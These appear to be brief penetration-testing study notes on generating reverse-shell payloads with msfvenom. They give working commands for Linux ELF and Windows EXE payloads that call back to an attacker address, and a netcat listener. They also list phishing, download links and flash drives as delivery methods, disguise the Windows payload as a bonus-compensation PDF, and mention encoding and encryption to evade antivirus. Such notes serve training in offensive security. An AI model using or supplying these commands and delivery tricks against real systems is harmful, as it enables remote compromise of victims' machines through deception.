
List all available payloads
```shell-session
msfvenom -l payloads
```

Build a stageless payload on Linux
```shell-session
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
- Call MSFvenom
- -p is the flag to indicate creating a payload
- Linux 64-bit stageless payload that will initiate a TCP-based reverse shell
- Address and port that it will reach back to
- -f specifies the format the generated binary should be in, in this case, .elf
- > output with name of file

Executing the payload
- Phish
- Download link on a website
- Combine with Metasploit (requires internal network access already)
- Flash drive (on-site)

Make sure to listen on host for connection
```shell-session
sudo nc -lvnp 443
```


Building a stageless payload for Windows
```shell-session
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

Needed to get past AV:
- Encoding
- Encryption

